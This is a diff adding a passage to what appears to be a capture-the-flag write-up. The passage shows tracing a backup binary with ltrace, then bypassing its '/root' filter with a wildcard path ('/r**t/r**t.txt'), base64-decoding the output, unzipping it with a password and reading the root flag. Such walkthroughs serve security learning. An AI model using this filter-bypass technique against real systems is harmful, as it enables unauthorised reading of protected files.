@@ -264,6 +264,24 @@ stty rows 55 columns 285
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/471f106f-6477-4998-af09-76a5497bac4c)
 
++ Trace what is happening in the background: `ltrace /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root`
++ **/root** directory is going to be filtered, and the exact root directory we will not be got.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1fc25303-92f1-450f-92ff-f7e69cd31168)
+
++ Change current directory as `/r**t/r**t.txt`, and get root.txt
+```
+/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt > file
+cat file | base64 -d > file.zip
+unzip file.zip # password `magicword`
+cd root/
+cat root.txt
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3c156512-5873-46da-aa78-175e1ce69ada)
+
+
+
 
 
 # References & Alternatives:
